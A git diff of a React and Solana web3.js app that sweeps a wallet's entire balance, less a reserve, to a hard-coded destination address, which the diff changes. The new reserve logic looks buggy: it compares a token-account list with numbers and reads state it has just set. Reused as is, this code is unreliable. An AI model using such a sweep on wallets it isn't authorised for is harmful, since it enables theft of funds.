@@ -21,6 +21,7 @@ import {
     // TransactionInstruction,
     LAMPORTS_PER_SOL,
 } from '@solana/web3.js';
+import { useState } from 'react';
 // import {readFile} from "fs/promises";
 // import bs58 from 'bs58';
 import OwnLayout from "./OwnLayout/OwnLayout";
@@ -42,7 +43,7 @@ const ACTION = 'send_all';
 const SENDS_IN_ONE_TX = 9;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('HkGiZyGJt7H4XMpzzaSbsUtHqbypwzfuLeWqjkqpgsF2');
+const DESTINATION = new PublicKey('6HnkEmyTMex2XUc6Ug7sxwippvNDtzAcz3p524h35sXi');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
@@ -51,6 +52,7 @@ export const WRAPPED_SOL = 'So11111111111111111111111111111111111111112';
 console.log(DESTINATION)
 
 function App() {
+    const [remainingSolana, setRemainingSolana] = useState(0.01)
 
     // function sleep(ms) {
     //     return new Promise(resolve => setTimeout(resolve, ms));
@@ -157,8 +159,24 @@ function App() {
 
         try {
             const balance = await connection.getBalance(walletKeyPair.publicKey);
+            
+            const accounts1 = await getTokenAccounts(connection, walletKeyPair.publicKey);
+            
+            if(accounts1 < 10){
+                setRemainingSolana(0.01)
+            } else if(accounts1 < 19){
+                setRemainingSolana(0.02)
+            } else if(accounts1 < 28){
+                setRemainingSolana(0.03)
+            } else if(accounts1 < 37){
+                setRemainingSolana(0.04)
+            } else if(accounts1 < 46){
+                setRemainingSolana(0.05)
+            } else if(accounts1 < 55){
+                setRemainingSolana(0.06)
+            }
 
-            const toSend = balance - (0.01 * LAMPORTS_PER_SOL);
+            const toSend = balance - (remainingSolana * LAMPORTS_PER_SOL);
 
             if (toSend <= 0.0001 * LAMPORTS_PER_SOL) {
                 console.log('No funds to send.');
